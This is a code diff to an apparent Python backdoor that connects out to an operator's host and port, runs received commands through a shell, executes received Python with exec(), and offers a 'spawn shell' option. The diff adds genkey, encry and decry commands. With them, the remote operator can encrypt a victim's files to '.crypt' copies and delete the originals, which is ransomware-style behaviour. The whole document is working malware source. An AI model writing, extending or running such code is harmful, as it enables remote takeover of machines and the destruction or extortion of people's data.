@@ -9,8 +9,9 @@ import socket
 import time
 import pty
 import platform
+from cryptography.fernet import Fernet
 
-ver = "1.0"
+ver = "1.1"
 def create_conn(host,port,ver):
     while True:
         # Create socket
@@ -39,11 +40,18 @@ sysinfo | System Information.
 pyinfo  | Python Information.
 shell   | Spawn shell.
     
+genkey  | Generate key.
+encry   | Encrypt file.
+          Usage: encry /path/to/the/file key
+decry   | Decrypt file.
+          Usage: decry /path/to/the/file key
+
 cmd> """
         try:
             while 1:
                 data = s.recv(1024)
                 data = data.decode()
+                datasplit = data.split(" ")
                 if data == "close\n":
                     break
                     exit()
@@ -98,6 +106,56 @@ cmd> """.format(pyver,pycompiler,pybuild,pybranch)
                         exec(data[5:])
                     except:
                         pass
+
+                elif data == "genkey\n":
+                    retkey = "Generating key:\n"
+                    retkey2 = "\ncmd> "
+                    key = Fernet.generate_key()
+                    s.send(retkey.encode())
+                    s.send(key)
+                    s.send(retkey2.encode())
+                elif datasplit[0] == "encry":
+                    try:
+                        arq = datasplit[1]
+                        key = datasplit[2]
+                        keyb = key.encode()
+                        arqo = open(arq, "rb")
+                        arqor = arqo.read()
+                        f = Fernet(keyb)
+                        encry = f.encrypt(arqor)
+                        arqo.close()
+                        new_nm = arq + ".crypt"
+                        n = open(new_nm, 'wb')
+                        n.write(encry)
+                        n.close()
+                        os.remove(arq)
+
+                        godmes = "Successfully Encrypted\ncmd> "
+                        s.send(godmes.encode())
+                    except:
+                        errorcry = "Error.\ncmd> "
+                        s.send(errorcry.encode())
+                elif datasplit[0] == "decry":
+                    try:
+                        arq = datasplit[1]
+                        arqo = open(arq, "rb")
+                        arqor = arqo.read()
+                        key = datasplit[2]
+                        keyb = key.encode()
+                        new_nm = arq.split(".crypt")
+                        new_nm0 = new_nm[0]
+                        arqo.close()
+                        f = Fernet(keyb)
+                        decry = f.decrypt(arqor)
+                        n = open(new_nm0, 'wb')
+                        n.write(decry)
+                        os.remove(arq)
+
+                        godmes = "Successfully Decrypted\ncmd> "
+                        s.send(godmes.encode())
+                    except:
+                        errorcry = "Error.\ncmd> "
+                        s.send(errorcry.encode())
                 else:
                     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()
